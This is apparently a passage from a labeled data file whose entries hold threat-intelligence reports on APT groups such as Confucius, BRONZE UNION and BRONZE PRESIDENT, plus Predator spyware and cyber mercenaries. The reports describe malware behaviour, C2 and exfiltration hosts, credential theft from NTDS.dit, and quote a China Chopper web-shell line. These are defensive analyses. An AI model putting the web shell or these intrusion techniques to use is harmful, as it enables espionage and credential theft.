        "explain": "Affected by many factors, Pakistan has long suffered from serious local terrorism threats. The country has also taken counter-terrorism as an important national security strategy. In the second half of 2022, the Pakistani security forces carried out many intelligence-based operations (IBO) in Baluchistan, Khyber and North Waziristan, and killed many terrorists. Pakistan’s recent high-profile performance in counter-terrorism has attracted the attention of India. On November 30, 2022, NSFOCUS Security Labs spotted a cyber-attack against the armed forces in Multan, Pakistan. The attacker used the IBO action report in Lodhran District of Multan as bait to try to deliver a variant of the Trojan program to control the victim’s devices. After analysis, NSFOCUS Security Labs confirmed that the leader of the event was the Indian APT organization Confucius.Confucius is an APT organization funded by India. It has been carrying out cyber-attacks since 2013, mainly targeting Pakistan, China and other neighboring countries of India. It has a strong interest in the military, government agencies, energy and other fields. Confucius uses both the Windows and Android Trojan programs to spy on the target to steal intelligence. The attack tools include SubBird, CharSpy and Hornbill, which have strong development and penetration capabilities. In this attack, Confucius followed its common bait construction mode and used a new variant of the known attack tool MessPrint.In this cyber attack, Confucius attackers constructed a phishing document named “IBO_Lodhran. doc” and a phishing document named US_Dept_of_State_Fund_Allocations_for_Pakistan.doc”, targeting the security forces and diplomatic government departments of Pakistan respectively. These phishing documents carry intelligence content with a certain degree of authenticity, induce the victim to start the editing function of the document through a pop-up message, and then implement an attack process of embedding a variant Trojan horse.When the macro in the above phishing document is executed, the document releases a file named gist.txt to the specified directory and set a scheduled task that runs every 30 minutes to run the file regularly.The gist.txt is a PowerShell trojan actually. It initiates a link first to a fixed path tcp://142.234.157[.] 195:8080 to test connectivity, and uploads the user name, computer name, mac address, system information and other contents of this machine as registration information; Then it downloads encrypted data from the fixed path http://microsoftonedriver[.] com: 8989/enc.txt and decrypts it as VERSION.dll and uses rundll32 to load and execute. The VERSION.dll is the main Trojan program used by Confucius in this event, and the CnC it connected is tcp://info-updates.ddns[.]net:8080.The main Trojan program VERSION.dll is a variant of a known attack component used by Confucius. To facilitate follow-up tracking, NSFOCUS Security Labs named the attack component MessPrint. Compared with previous versions, the MessPrint variant has changed greatly in terms of function and confrontation, and its main version number has also changed from 2.X.X to 3.1.0.The main functions of the MessPrint variant this time are divided into three parts: operation log recording, victim host information uploading and command execution. It created a log file name log.txt first in the directory C: \\ProgramData. All prompt information in the subsequent stages would be recorded in the log file. We did not find this recording function in its previous versions, so we speculate that this variant is a test version directly used by Confucius in network attack activities. Subsequently, the Trojan program collected various information about the victim’s host, summarized this information into a piece of encrypted data and sent it to its CnC. The information collected by the Trojan is shown in the following table.The information above directly used the fixed symbol # $# * as the separator and the fixed symbol iqaz as the end sign. The information above would be encrypted using the following encryption methods and then sent to CnC:After sending the host information, the variant and CnC used the keywords “check_status”, “verified”, “hi”, and “order” for multiple rounds of confirmation, and finally entered the instruction execution mode. In the command execution part, the MessPrint Trojan can respond to the following commands and parameters issued by CnC to download files, run programs, and execute CMD commands.Through analysis, it is found that the MessPrint variant Trojan has made many changes in the functional part. On the one hand, it protects the CnC communication process through encryption, on the other hand, it greatly reduces functions like file stealing and rebound shell that exist in previous versions. The changes above indicate that the positioning of the Trojan program has changed from full-function spyware to Stub-type backdoor Trojan, and the subsequent spying Trojan functions are separated into independent components through component splitting. This change is very common in the development of APT attack components in recent years. APT attackers can reduce the exposure risk of the overall framework through this refinement.In the MessPrint trojan program that appears this time, Confucius developers have added a lot of anti-analysis technology, which increases the difficulty of analyzing the trojan program. The MessPrint Trojan mainly uses an exception-based control flow obfuscation technology. This obfuscation changes the ordinary linear flow into a try-throw-catch structure so that the two original linearly connected code segments are divided into try-and-catch blocks that are no longer adjacent. In this way, the C++ object is thrown at a specific location, so that the execution process needs to jump to the code that can be executed directly under the linear structure through VS C++ exception handling.This confusion method can be used for static analysis of some decompilation tools because most pseudocodes cannot restore the above exception-handling process normally. In addition, Confucius developers also abused some common code obfuscation techniques in the MessPrint variant, such as stack expansion, junk code and meaningless code, which further hindered static analysis. Considering a large number of traces in the development, we speculate that Confucius developers want to use confusion to reduce the losses caused by exposure when they have to enable the development version of the Trojan program.As a direct demonstration of the national armed forces in peacetime, a series of anti-terrorism operations recently held in Pakistan have made India very sensitive. The spotted APT attack also shows that India has begun to put cyber-attack forces into relevant reconnaissance activities. In the analysis, we found that Confucius developers still remain active in component development, and on the other hand, it also confirmed the prevalence of splitting and framing of attack components by APT developers. The improving defense capabilities in the APT capture, analysis and disclosure process in recent years compel APT attackers to use the framework idea to rebuild the attack tool and control the use of components at all levels through the way of level-by-level delivery to reduce the risk of complete exposure.\n\n\n",

        "explain": "Mercenarism is a practice that dates to the classical world. But this practice declined in the nineteenth century with the development of conscription or compulsory military service. The use of mercenaries only re-emerged with the wars of decolonization and ensuing civil wars. This phenomenon came back once again after the end of the Cold War. Following the surge in mercenary activity, the phenomenon had subsided but then again re-emerged in a somewhat different form through the growth of private military companies (PMCs). A 2016 analysis of the market of the PMCs in armed conflict shows that more than 1,500 PMCs operate nowadays in conflict areas, from Africa to the Balkans to the Middle East. Although mercenaries are often originally experienced military soldiers, their main objective is to meet the mission given by the client who has contracted them. In other words, they are less likely than members of national armies to be asked to consider the implications of their behavior – be it on local communities, human rights, or on their state of origin – and instead, are led by the need to satisfy a client in exchange for financial reward. Generally, mercenaries provide support for military operations – most often in the form of defensive security, training for national forces, and technical support. The UN Working Group on the use of mercenaries has identified cyber mercenaries as one category of actors that can generate mercenary-related activities. This entails a wide range of military and security services provided in cyberspace, including data collection and espionage. A warning over cyber mercenaries can be found in an annual report published in 2013 by Britain’s Intelligence and Security Committee, a watchdog body of senior lawmakers that oversees Britain’s spy agencies. The report described the mercenaries as skilled cyber professionals undertaking attacks on diverse targets such as financial institutions and energy companies. When state actors employ cyberweapons, there is at least the prospect of regulation and accountability, but when private companies are involved, things get more complicated. The cyber domain is increasingly becoming a battleground among nation-states. We can mention the cyberattack committed by Russia against the Estonian banks, newspapers, and servers, the one faced by Georgia one year later, or the US-Israeli Stuxnet virus that has been sent to spy on and reprogram Iranian industrial, hydroelectric, and nuclear systems. Cyberwarfare has indeed been recognized as a method of warfare that can infiltrate, disrupt, damage, or even destroy military or civilian objects, and cause serious human harm. Thus, it must comply with international humanitarian law. Even though a large part of the operations described as cyberattacks take place outside the framework of armed conflict, explains Cordula Ddroege, legal adviser to the ICRC, information warfare only concerns computer operations carried out in times of armed conflict and excludes all those carried out in peacetime, noted Michael Schmitt, Chair of the Department of International Law at the US Naval War College. In 2009, an expert group was mandated by NATO to examine the international legal framework for cyberoperations. The question then was how does the international law of armed conflict apply to confrontations in cyberspace? Published in 2013, the Tallinn Manual was the answer to this question and contains some standards and rules that govern interstate cyber actions in times of war. However, nothing about those operations that take place in times of peace was mentioned in it. This means that the international humanitarian law (IHL) cannot be invoked when a cyberattack occurs in peacetime, since it only considers the ones in armed conflicts whether between states, between states and organized armed groups, or between organized armed groups, as mentioned by Cordula Ddroege. But, while States are focused on combating cyberattacks from nation-states, the real threat is elsewhere. According to Michael Rogers, head of U.S. Cyber Command, a more dangerous threat (…) comes not from direct cyberattacks by nation-states, but from the growing international marketplace for state-sponsored cyber mercenaries that carry out the surreptitious cyber operations of a government. With 300 private companies covering areas ranging from banking security to critical infrastructure defense, Israel is a world leader in the field of private cyber technology. Some of these companies exploit and profit from the fine line between defensive and offensive cyber capabilities to provide their clients with services that do not fall within the legal framework. As an example, the privately-held Israeli company – NSO Group, which makes hacking software it sells to foreign governments and law enforcement authorities to track down terrorists and criminals, has since 2019 faced a number of allegations that its customers used its software to target 1,400 WhatsApp users – journalists, government officials, and human rights advocates. The report on the evolving forms, trends, and manifestations of mercenaries and mercenary-related activities published in 2020 by the UN Working Group on the Use of Mercenaries confirms that states tend more and more to conduct cyber operations through third-party groups, known as cyber-mercenaries/PMCs, to perform various functions such as: Conducting cyber operations aimed at weakening the military capabilities and assets of enemy armed forces; Undermining the integrity of another state’s territory. In cybersecurity, identifying the individual, group of individuals, or state behind a cyber-attack is generally the most difficult part. This technical or skill-based inability to identify an adversary makes it impossible to apprehend and prosecute a cyber-attacker. Indeed, that lack of attribution then makes it harder for governments to respond, and the lack of a threat of reprisal makes deterrence difficult, if not impossible. Additionally, while the private sector may be able to pay its people more, drawing talent, and technological prowess, away from public service, the government still holds one trump card: the law. Indeed, governments may follow treaties, protocols, and norms to maintain positive international relations, but the private sector executes its missions with little regard for legal standards. After all, privateers are driven by ideologies or financial gain. They do not care about the effect of their actions on international relations and do not consider laws. From a legal perspective, the fact that cyber-related activities can escape regulatory control, accountability mechanisms, and move across borders is a serious concern. Not only is it rarely possible to attribute responsibility to a cyber attacker and their agent/client, but the potential for human rights violations is even greater. Moreover, the development of offensive cyber capabilities requires appropriate policy and regulatory responses by states to ensure that they are consistent with international human rights standards and principles of international humanitarian law. In 2018, the UN General Assembly adopted a resolution called Advancing responsible State behavior in cyberspace and established two groups to discuss issues of security in the information and communications technology field and could potentially guide in this respect: the Open-ended Working Group on Developments in the Field of Information and Telecommunications in the Context of International Security, and the Group of Governmental Experts on Advancing Responsible State Behaviour in Cyberspace in the Context of International Security. In conclusion, these facts point to several elements related to cyber mercenaries’ activities that need to be considered. First, the development of cyber mercenary activities and their subcontracting by states is worrying at various levels as mentioned above. Therefore, the examination and evaluation of the impact of the UN resolution on states, and consequently, on cyber mercenaries is fundamental. However, it seems too early to do so today. Finally, it seems that the status of PMCs must be clarified: are they considered armed groups or not? If they are armed groups, then the norms of international humanitarian law must be applicable and applied, beyond the question of state responsibility. If they are not, then the question of state responsibility should be reinforced.\n\n\n",

        "original_label": "true",

        "explain": "Back in February, we noted the similarities between the Patchwork and Confucius groups and found that, in addition to the similarities in their malware code, both groups primarily went after targets in South Asia. During the months that followed in which we tracked Confucius’ activities, we found that they were still aiming for Pakistani targets. During their previous campaign, we found Confucius using fake romance websites to entice victims into installing malicious Android applications. This time, the threat actor seems to have a new modus operandi, setting up two new websites and new payloads with which to compromise its targets.The first website uses adult content as a lure, via an Android application called Fuddi Duniya, which links to a website that displays nude pictures every day. The app’s APK is linked directly from the homepage, with a disclaimer stating that Google Play does not allow pornography in their store. The app’s features are similar to the previous malicious Android application, such as having the ability to record audio and steal SMS, accounts, contacts and certain file types from specific directories. In addition, the application now retrieves the last known location and uses the development platform Google Firebase to upload the stolen content. The second fake website is again related to chat, with a background suggesting that it can help find users a partner. Initially, a link to a malicious Android application hosted on Google Play that shared the same features as the application described above was present. But after we reached out to Google while carrying out the research, the application was removed from the store and the Same as with the fake Tweety chat application we described in detail in our previous research, a Windows application with real chat features based on the open-source chat application RocketChat was offered. Similarly, this application also comes bundled with malicious .NET code. While small and relatively simple, we found this malicious application interesting to analyze as it revealed the countries targeted by the threat actor. The application is a simple downloader that sends some basic information (username, antivirus, IP address, and operating system version) encrypted using triple Data Encryption Standard (DES).Periodically, the malware tries to contact the Command-and-Control (C&C) server with the username encoded into parameters. Based on the information they retrieve, the operators can then decide to instruct the malware to download the second stage payload. This function is similar to the various versions of backdoors (such as sctrls and sip_telephone) that we analyzed in our previous blog post and whitepaper. An interesting feature of the downloader: It uses an online service to retrieve the victim’s IP address and country, which it compares with a list of allowed countries. If the victim seemingly comes from a different country, the program will self-delete and quit. This list contains:We noted that it does both client-side and server-side IP filtering, showing that the attacker has improved its infrastructure. At the end of last year, a C&C from the same threat actor was not only accessible from any IP address, but it was possible to browse the server directory tree without authentication. After impersonating a fake victim of interest, we obtained a second stage payload (Detected as TROJ_DELF.XXWZ), which is a filestealer based on the Delphi programming language similar to the “svctrls” malware described in our previous blogpost. This one is called “sysctrls” and it looks for files with the following extensions:It then sends them via a POST HTTP request to windefendr[.]com/description.php. Further analysis of this filestealer revealed interesting links with other threat actor groups.We already mentioned that Confucius had possible links to other groups in our previous blog post, which mentioned code sharing between Patchwork and Confucius. Both groups used a backdoor with the same configuration file structure and commands. We found more code shared among the two threat actor’s malware, as Patchwork recently used multiple Delphi malware similar to some of the Delphi malware we described before. We initially spotted some visual similarities between the malware used. Although no forms are displayed while the malware is running, we can see its TForm object in the Delphi decompiler. The TForm object often has two TTimer objects — but sometimes we have seen one or even three of these objects — usually with random names. Occasionally, listboxes with encrypted strings are also added. While looking into any of the TTimers’ OnTimer methods, we often found a certain kind of structure: A pointer to an encrypted string stored in an EDX register followed by the call to the decryption function. Our analysis revealed three of them. The first involves a very simple routine that flips every bit of the string. The second algorithm involves a hardcoded key, which is transformed by taking the five lower bits of each character, and then used as a XOR key. In some cases, the key is split in half in the binary, so it is first reunited before being used. Finally, our third algorithm uses a 94-character substitution table. This algorithm was previously discussed by security researchers in a Confucius-related blog post. For each of these routines, we found a recent sample going back to a domain name belonging to Patchwork’s infrastructure. The substitution tables of the third algorithm were randomly generated at build time, while the attacker seemingly set the keys used in the second algorithm. We found six different keys in the latter category that were different for the Patchwork and Confucius group.Interestingly, one of those keys, “xldbszcd”, was found in a file stealer used by Confucius (472ea4929c5e0fb4e29597311ed90a14c57bc67fbf26f81a3aac042aa3dccb55, Detected as TSPY_CONFSTEAL.A) as well as in two other file stealers. One file stealer (cca74bb322ad7833a21209b1418c9837e30983daec30d199a839f46075ee72f2, Detected as TSPY_DELF.SUW) published by security researchers in 2013 and linked to the domain myflatnet[.]com, was attributed by several parties to the Hangover group. The other file stealer (1f0dabd61947b6df8a392b77a0eae33777be3caad13698aecc223b54ab4b859a, Detected as TROJ_DELF.XXWZ) is related to a domain reported in September 2016. That report also mentioned InPage software targeting and Delphi backdoors.After some research, we found multiple Delphi backdoors that used any of the three decryption routines. The backdoors also linked to an infrastructure matching old Hangover domains as well as the infrastructure of domains from the September 2016 blog post. Some of these samples were several years old and had left the original name of the bit-flip decryption algorithm, which was “EnDecrypt”. This algorithm matches the following code snippet.Aside from their Delphi malware, Patchwork is still active. Lately, they have been sending multiple RTF files exploiting CVE-2017-8570. The dropped payloads are modified versions of the Remote Administration Tool QuasarRAT that can be traced to the domains sastind-cn[.]org and tautiaos[.]com.The group still uses the Badnews malware, a backdoor with information-stealing and file-executing capabilities, albeit updated with a slight modification in the encryption routine at the end of 2017, when they added Blowfish encryption on top of their custom encryption described in our former Patchwork blogpost.Threat actors like Confucius and Patchwork are known for their large arsenal of tools and ever-evolving techniques that can render traditional security solutions — which are often not designed to handle the persistent and sophisticated threats detailed in this blog — ineffective. To help combat these kinds of threats organizations will need to take a more proactive and focused security posture that can cover the most ground in terms of security. Some specific security measures organizations can implement: In an ideal scenario, an organization’s in-house security team implement all of these and other security measures. The reality is that IT departments of small to large-sized organizations are not equipped to handle the more advanced threats that groups like Confucius use in their attacks. Since these teams also handle the day-to-day IT requirements of the organization, taking on a more involved and proactive stance may not be easy. In this case, an organization can look into third party security providers who can handle specialized work, such as root cause analysis and detailed research, and also provide a remediation plan that gives organizations a better chance against advanced threats.Patchwork uses email as an entry point, which is why securing the email gateway is important.

        "explain": "Former Egyptian MP Ahmed Eltantawy was targeted with Cytrox’s predator spyware through links sent via SMS and WhatsApp. Former Egyptian MP Ahmed Eltantawy has been targeted with Cytrox’s Predator spyware in a campaign believed to be state-sponsored cyber espionage. After Eltantawy made his intention to run for president in the 2024 elections known, the targeting took place between May and September 2023. The spyware was distributed using links sent via SMS and WhatsApp, network injection, and visits to certain websites by Eltantawy. The Citizen Lab examined the assaults with the help of Google's Threat Analysis Group (TAG), and they were able to acquire an iPhone zero-day exploit chain that was designed to be used to install spyware on iOS versions up to 16.6.1. Eltantawy's device was forensically examined by The Citizen Lab, which uncovered several efforts to use Cytrox's Predator spyware to target him. In the investigation, The Citizen Lab and TAG discovered an iOS exploit chain utilised in the attacks against Eltantawy. They started a responsible disclosure procedure with Apple, and as a consequence, it resulted in the release of updates patching the vulnerabilities used by the exploit chain. Mobile zero-day exploit chains may be quite expensive, with black market values for them exceeding millions of dollars. The Citizen Lab also identified several domain names and IP addresses associated with Cytrox’s Predator spyware. Additionally, a network injection method was also utilised to get the malware onto Eltantawy's phone, according to the study. He would be discreetly routed to a malicious website using network injection when he went to certain websites that weren't HTTPS.Cyber espionage, also referred to as cyber spying, is a sort of cyberattack in which an unauthorised user tries to obtain confidential or sensitive information or intellectual property (IP) for financial gain, business benefit, or political objectives. Users are advised to keep their devices up-to-date and enable lockdown Mode on iPhones. Former Egyptian MP targeted with predator spyware ahead of 2024 presidential run hence Update your macOS Ventura, iOS, and iPadOS devices, as Apple has released emergency updates to address the flaws. Apple has Released Emergency Updates Amid Citizen Lab’s Disclosure. Apple has issued three emergency updates for iOS, iPadOS (1), and macOS Ventura (2). The updates address the following vulnerabilities: CVE-2023-41991, CVE-2023-41992, CVE-2023-41993. Apple customers are advised to immediately install these emergency security updates to protect themselves against potential targeted spyware attacks. By updating promptly, users will ensure that their devices are secure and cannot be compromised by such attacks exploiting these particular zero-day vulnerabilities. Hence it is advisable to maintain up-to-date software and enable security features in your Apple devices. Ahmed Eltantawy, a former Egyptian MP and presidential candidate, was targeted with Cytrox’s Predator spyware after announcing his bid for the presidency. He was targeted by Cytrox Predator Spyware Campaign. Such an incident is believed to be State-Sponsored Cyber Espionage. The incident raises the question of loss of privacy and shows the mala fide intention of the political opponents. The investigation Findings reveal that Ahmed Eltantawy was the victim of a sophisticated cyber espionage campaign that leveraged Cytrox’s Predator spyware. Apple advised that all users are urged to update their Apple devices. This case raises alarming concerns about the lack of controls on the export of spyware technologies and underscores the importance of security updates and lockdown modes on Apple devices.\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "Secureworks® Counter Threat Unit™ (CTU) researchers have tracked the activities of the BRONZE UNION threat group (also known as Emissary Panda, APT 27, and LuckyMouse) since 2013. CTU™ analysis suggests that BRONZE UNION is located in the People's Republic of China. The threat group has historically leveraged a variety of publicly available and self-developed tools to gain access to targeted networks in pursuit of its political and military intelligence-collection objectives. In 2018, CTU researchers identified evidence of BRONZE UNION leveraging tools that have been publicly available for years. However, the variants used in 2018 included updated code.In mid-2018, CTU researchers observed BRONZE UNION deploying an updated version of the ZxShell remote access trojan (RAT). ZxShell was developed in 2006 by the persona “LZX”, who then publicly released the source code in 2007. Although various threat actors have created different variations of the RAT, the version used by BRONZE UNION in 2018 contained some previously unobserved properties that suggest the threat group's capabilities continue to evolve: Figure 1 shows a session captured by Red Cloak™ where a BRONZE UNION threat actor launched a remote shell using ZxShell. Like ZxShell, publicly available Gh0st RAT source code led to the emergence of several different variants. In a 2018 campaign, BRONZE UNION likely deployed modified Gh0st RAT malware to multiple systems within a compromised environment that were important to the threat actors' objective. When executed with administrator privileges, the Gh0st RAT binary file was written to %System%\\FastUserSwitchingCompatibilitysex.dll. The installer then created a Windows service and associated service dynamic link library (DLL) chosen from the names listed in Table 1.This Gh0st RAT sample communicated with IP address 43 . 242 . 35 . 16 on TCP port 443, although the traffic is a custom binary protocol and not HTTPS. The malware author also modified the standard Gh0st RAT headers to obfuscate the network traffic (see Figure 2)Bytes 0-4, which are typically known as the Gh0st RAT “identifier,” are randomized in this case. Bytes 5-8 indicate the packet size, and bytes 9-12 indicate the zlib-decompressed packet size. In a departure from previous Gh0st RAT versions, the five bytes at the end of this packet are an XOR key, which must be applied to the packet data before the zlib decompression can be performed. The XOR key is different for each execution of the malware. Once the packet is decoded and decompressed, the data shown in Figure 3 is visible.The first byte of Figure 3 shows the value 0x66, which is the Gh0st RAT code for “login”. After sending the initial phone-home request, Gh0st RAT exchanges 22-byte 'command' packets with its command and control (C2) server. Once again, the first five bytes are randomized and the zlib-compressed part of the packet is XOR-encoded, but the same identifiable structure remains. In the example command packet shown in Figure 4, the first five bytes are the randomized header and the next eight bytes show the compressed and uncompressed size of the data. The XOR key for this packet is 0x7c. In addition to publicly available tools, BRONZE UNION has also used proprietary remote access tools such as SysUpdate and HyperBro since 2016. Despite self-developed tools generally benefitting from lower detection rates than publicly available tools, the threat actors appear to use their own tools more sparingly after securing consistent network access. SysUpdate is a multi-stage malware used exclusively by BRONZE UNION. It has been delivered by multiple methods. In one instance observed by CTU researchers, it was downloaded by a malicious Word document using the Dynamic Data Exchange (DDE) embedded command method. In another incident, the threat actor manually deployed SysUpdate via previously stolen credentials after gaining access to the environment. In a third case, it was delivered via a redirect from a strategic web compromise (SWC). Regardless of the delivery method, the payload is a WinRAR self-extracting (SFX) file that installs the SysUpdate stage 1 payload.SysUpdate stage 1 has no capability beyond downloading the second payload file, SysUpdate Main (see Figure 6). SysUpdate Main employs HTTP communications and uses the hard-coded User-Agent “Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36”. It downloads a file named m.bin using the HTTP GET method and injects this file into a new svchost.exe process without saving the file to disk. After performing this download, SysUpdate Main reverts to its binary protocol for any additional commands from the C2 server, beaconing every three minutes. The SysUpdate Main file analyzed by CTU researchers included remote access capabilities such as managing files and processes, launching a command shell, interacting with services, taking screenshots, and uploading and downloading additional malware payloads. SysUpdate is flexible malware, as capabilities can be easily introduced and withdrawn by supplying a new payload file. The operator could remove second-stage capabilities at any time and revert to the first stage by supplying a replacement payload file. By withdrawing second-stage payloads when not in use, operators can limit exposure of their full capabilities if the malicious activity is detected. BRONZE UNION was one of the most prolific and active targeted threat groups tracked by CTU researchers in 2017 and 2018. The threat actors have access to a wide range of tools, so they can operate flexibly and select tools appropriate for intrusion challenges. During complex intrusion scenarios, the threat actors leverage their proprietary tools, which offer custom functionality and lower detection rates. They appear to prefer using widely available tools and web shells to maintain access to networks over longer periods. After accessing a network, the threat actors are adept at circumventing common security controls, escalating privileges, and maintaining their access to high-value systems over long periods of time.\n\n\n",

Secureworks® Counter Threat Unit™ (CTU) researchers have observed BRONZE PRESIDENT activity since mid-2018 but identified artifacts suggesting that the threat actors may have been conducting network intrusions as far back as 2014. CTU™ researchers divided the threat intelligence about this threat group into two sections: strategic and tactical. Executives can use the strategic assessment of the ongoing threat to determine how to reduce risk to their organization's mission and critical assets. Computer network defenders can use the tactical information gathered from incident response investigations and research to reduce the time and effort associated with responding to the threat group's activities.Analysis of a threat group's targeting, origin, and competencies can determine which organizations could be at risk. This information can help organizations make strategic defensive decisions in relation to the BRONZE PRESIDENT threat group.CTU researchers have observed BRONZE PRESIDENT targeting multiple NGOs. The threat actors steal data from compromised systems over a long period of time, which likely indicates a long-term objective of monitoring the target's network. BRONZE PRESIDENT uses custom batch scripts to collect either specific file types (including files with .pptx, .xlsx, .pdf extensions) or all files within a specific location. CTU researchers also observed evidence that the threat actors collect credentials from high-privilege network accounts and reputationally sensitive accounts, such as social media and webmail accounts. Additionally, CTU researchers have observed evidence of BRONZE PRESIDENT targeting political and law enforcement organizations in countries adjacent to the PRC, including Mongolia and India. Some of the group's phishing lures suggest an interest in national security, humanitarian, and law enforcement organizations in the East, South, and Southeast Asia (see Figure 1). These examples reveal BRONZE PRESIDENT's likely intent to conduct political espionage in other countries in addition to targeting NGOs. It is likely that BRONZE PRESIDENT is sponsored or at least tolerated by the PRC government. The threat group's systemic long-term targeting of NGO and political networks does not align with patriotic or criminal threat groups.BRONZE PRESIDENT has deployed a variety of remote access tools. The use of tools not previously observed by CTU researchers suggests that the group could have access to malware development capabilities. BRONZE PRESIDENT also uses widely available or modified open-source tools, which could be a strategic effort to reduce the risk of attribution or to minimize the need for tool development resources. Following a network compromise, the threat actors typically delete their tools and processes. However, the group is content leaving some malware on the network, likely to provide a contingency if other access channels are removed. When the group's activities were detected in one incident, it had elevated privileges and had maintained access to the targeted environment for several months. This finding indicates the group's effectiveness at maintaining long-term access to a targeted network.Incident response engagements have given CTU researchers insight into the threat group's tools and tactics CTU researchers and Secureworks incident responders have observed BRONZE PRESIDENT using the following tools, along with several custom batch scripts for locating and archiving specific file types:While analyzing hosts compromised by BRONZE PRESIDENT, CTU researchers identified other malware artifacts. Although there was no evidence of the group using the malware, the threat actors may have leveraged its access or capabilities during earlier phases of the intrusions. The BRONZE PRESIDENT intrusions observed by CTU researchers appear to have taken place over several months or years. China Chopper web shell files named error404.aspx included the “eval(Request.Item[“|”],“unsafe”);” string. To successfully interact with the web shell, a threat actor sent HTTP requests that included the “|” parameter. The web shell files appeared to be installed during the timeframe that BRONZE PRESIDENT was active on the system (see Figure 3).CTU researchers identified a variety of post-compromise tools stored under %AppData% (e.g., \\AppData\\Roaming\\Temp) on several compromised systems. The widespread proliferation and use of the following tools suggest that the group likely has the knowledge and capability to use them as part of its operations:At the time of detection, observed BRONZE PRESIDENT incidents had likely been ongoing for several months or even years. As a result, CTU researchers were unable to ascertain the initial access vector. In October 2019, third-party researchers described a phishing campaign that used C2 infrastructure that CTU researchers attribute to BRONZE PRESIDENT. This connection suggests that the group uses phishing emails with ZIP attachments that contain LNK files as an initial access vector. During one intrusion, the threat actors gained administrator access to all systems within a targeted business unit and installed their remote access tools on 80% of the hosts. The group installed multiple tools within the environment, including three different tools on a strategically important server, likely to provide contingency access options (see Table 1).During multiple intrusions, the threat actors employed various tools and techniques to understand the network environments. For example, they used Nmap to scan various internal IP address ranges and SMB ports (see Figure 4). They also relied on Nbtscan, net user, and ping commands to obtain insights and identify opportunities for lateral movement.BRONZE PRESIDENT regularly leverages Wmiexec to move laterally. During one intrusion, the threat actors extensively used this tool to execute WMI commands on remote hosts in the environment (see Figure 5).They also frequently leverage net commands to connect to other hosts (see Figure 6) using compromised credentials collected during early phases of the intrusion.During one intrusion observed by CTU researchers, the group used the native vssadmin tool on a domain controller to create a volume shadow copy:The threat actors retrieved the NTDS.dit file from the volume shadow copy. NTDS.dit contains Active Directory data, including password hashes for all users on a domain. Extracting hashes from the NTDS.dit file requires access to the SYSTEM file in the system registry:The threat actors saved both the SYSTEM file (system.hive) and NTDS.dit in the compromised host's c:\\windows\\ directory. These files were likely exfiltrated and exploited offline to retrieve user password hashes, which could then be cracked or used to perform pass-the-hash attacks.BRONZE PRESIDENT's C2 techniques are dictated by its remote access tools. The group's primary and likely proprietary RCSession RAT communicates with a hard-coded C2 server using a custom protocol over TCP port 443. After connecting to its C2 server, RCSession checks in with an encrypted beacon and then awaits instruction. The ORat tool, which appears to be used less frequently by the group, communicates over TCP port 80 using a raw socket protocol (not HTTP). The Cobalt Strike tool has malleable C2 profiles. During one intrusion, it connected to multiple C2 domains on TCP port 80, including mail . svrchost . com, using the following request. Subsequent Cobalt Strike C2 servers included subdomains of svchosts . com, svrchost . com, and strust . club.Some BRONZE PRESIDENT C2 domains analyzed by CTU researchers were hosted on infrastructure owned by Dutch VPS provider Host Sailor, Hong Kong-based New World Telecoms, and Malaysia-based Shinjiru Technology (see Figure 7). The threat actors have used discrete infrastructure clusters that share matching hosting and registration characteristics. The pattern of infrastructure hosting suggests that the group parks its domains when not in use, an operational security technique that limits exposure of the group's overall hosting infrastructure.Some of BRONZE PRESIDENT's malware has persistence capabilities. For example, ORat uses a WMI event consumer to maintain its presence on a compromised host. The group also creates and maintains scheduled tasks to achieve this purpose. Figure 8 shows a Sysdriver scheduled task that periodically executes a Cobalt Strike payload.The threat actors tend to install malware on a large proportion of hosts during their intrusions. However, the group exercises restraint and defensive evasion tactics to minimize opportunities for network defenders to detect or investigate its activities. For example, the threat actors deleted volume shadow copies after using them for NTDS.dit retrieval: BRONZE PRESIDENT targets specific data types. The threat actors use custom batch scripts to create a list of files with predefined criteria and collate the identified files into a .rar archive (see Figure 9). CTU researchers have observed BRONZE PRESIDENT batch scripts named doc.bat, xls.bat, xlsx.bat, ppt.bat, pptx.bat, pdf.bat, and txt.bat. The group also uses the all.bat batch script to collect all files stored on a specific user's desktop. CTU researchers observed RCSession and Cobalt Strike on systems that BRONZE PRESIDENT targeted for data theft. Either of these tools could have been used to exfiltrate the archived data. BRONZE PRESIDENT has demonstrated intent to steal data from organizations using tools such as Cobalt Strike, PlugX, ORat, and RCSession. The concurrent use of so many tools during a single intrusion suggests that the group could include threat actors with distinct tactics, roles, and tool preferences. It is likely that BRONZE PRESIDENT has additional unobserved operational tools and capabilities. CTU researchers recommend that organizations apply controls to mitigate common intrusion techniques and behaviors along with controls that address the tools and techniques discussed in this analysis.The threat indicators in Table 3 are associated with BRONZE PRESIDENT threat campaigns.

        "original_label": "true",
        "label": "true",
        "explain": "The Andariel group is a subgroup of the Lazarus group that has been active since 2015. Andariel has a connection to the cyber-attack named Operation Black Mine that occurred in 2014 and 2015. However, Operation Black Mine is also associated with the attacks on the South Korean Military Agency in 2008 and the attacks against South Korean banks and broadcastersin 2013 (a.k.a DarkSeoul). The major targets of the Andariel Group include not only military agencies, defense industries, political organizations, security companies, ICT companies, and energy research institutes, but also financial targets, such as ATMs, banks, travel agencies, cryptocurrency exchanges, and online gambling users. Their main methods of attacks are spear phishing using macros, watering hole attacks exploiting Active-X vulnerabilities, vulnerability exploits on security and IT asset management systems, and supply chain attacks. The group makes use of well-known backdoors, such as Aryan and Gh0st RAT, but also uses self-developed backdoors, such as Andarat, Andaratm, Rifdoor, and Phandoor. Furthermore, this group appears to know Korean language and its IT environment. This report describes the several cyberattacks by Andariel Threat Group including main methods, and changes in their purpose and targets.The Andariel group uses a variety of attack techniques, and, in particular, they take advantage of vulnerabilities of local software in South Korea.The Andariel group uses the spear phishing method by understanding their target and sending emails with an attachment that appears to be from a relevant, seemingly trustworthy source. The attachments contain macro and trick the targeted recipient into activating the macro. However, this method of inducing macro activation has become more devious after 2015. [Figure 2] below shows the contents of attachments used in the 2015 attacks with the original method of inducing macro activation. The user can enable macro, but there is not a significant need to do so because the content is visible. However, malicious attachments found since 2017 show a new method. The contents of documents are blurred, as shown in [Figure 3], as if there is a problem with the display, increasing the likelihood of the recipients enabling the macros. The Andariel group also uses the watering hole technique, which compromise and inject exploit codes into a website. The targeted systems are infected with malware upon accessing the compromised website using a vulnerable web browser. These attacks also limit infection to specific IP address ranges, making it much more difficult to identify the attack targets. For the watering hole attack, the group usually embeds an Active-X vulnerability exploit codes in the target website. When the target accesses the website via an Internet Explorer browser with a specific 